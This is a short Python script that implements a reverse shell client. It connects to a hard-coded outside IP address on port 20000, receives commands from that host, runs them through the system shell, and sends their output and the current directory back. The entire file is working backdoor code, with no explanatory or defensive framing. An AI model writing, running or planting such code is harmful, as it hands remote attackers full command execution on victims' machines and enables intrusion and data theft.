import socket
import os
import subprocess

host = '188.78.49.189'
port = 20000
s = socket.socket()
s.connect((host, port))

while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == "cd":
		os.chdir(data[3:].decode("utf-8"))
	elif len(data) > 0:
		t = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = t.stdout.read() + t.stderr.read()
		output_string = str(output_bytes, "utf-8")
		s.send(str.encode(output_string + str(os.getcwd()) + "> "))

s.close()
